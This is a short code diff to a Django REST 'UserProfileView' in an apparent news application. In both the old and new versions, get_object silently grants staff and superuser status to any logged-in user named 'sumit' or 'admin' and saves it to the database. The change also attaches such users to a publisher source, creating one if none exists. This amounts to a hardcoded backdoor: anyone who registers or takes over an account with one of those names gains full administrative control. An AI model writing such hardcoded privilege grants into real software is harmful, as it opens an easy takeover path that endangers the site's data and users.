@@ -18,11 +18,18 @@ class UserProfileView(generics.RetrieveUpdateAPIView):
 
     def get_object(self):
         user = self.request.user
-        if user.username.lower() in ('sumit', 'admin') and (not user.is_staff or not user.is_publisher):
+        if user.username.lower() in ('sumit', 'admin') and not user.is_staff:
             user.is_staff = True
             user.is_superuser = True
-            user.is_publisher = True
-            user.save(update_fields=['is_staff', 'is_superuser', 'is_publisher'])
+            try:
+                from news.models import Source
+                src = Source.objects.first()
+                if not src:
+                    src = Source.objects.create(name="OmniNews Studio", url="https://omninewsproject.vercel.app")
+                user.publisher_source = src
+                user.save(update_fields=['is_staff', 'is_superuser', 'publisher_source'])
+            except Exception:
+                user.save(update_fields=['is_staff', 'is_superuser'])
         return user
 
 
